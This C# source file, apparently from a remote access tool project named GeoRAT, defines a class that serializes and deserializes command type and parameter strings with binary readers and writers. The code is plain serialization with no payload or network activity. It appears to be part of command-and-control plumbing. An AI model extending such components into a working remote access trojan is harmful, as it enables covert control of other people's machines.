

using System.IO;
using GeoRAT.Core.Interfaces;


namespace GeoRAT.Core.Commands
{
    //This class implements ICommandSerializer interface and simply serializes commands object into byte[] array and vice-versa 
    public class CommandSerializer : ICommandSerializer<Commands>
    {

     public byte[] Serialize(Commands cmd)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(stream))
                {
                    writer.Write(cmd.CommandType);
                    writer.Write(cmd.CommandParams);
                }
                return stream.ToArray();
            }

        }

       public Commands Deserialize(byte[] cmdbuf)
        {
            Commands command = new Commands();
            using (MemoryStream stream = new MemoryStream(cmdbuf))
            {
                using (BinaryReader read = new BinaryReader(stream))
                {
                   command.CommandType = read.ReadString();
                   command.CommandParams = read.ReadString();
                }
            }
            return command;
        }
    }
}
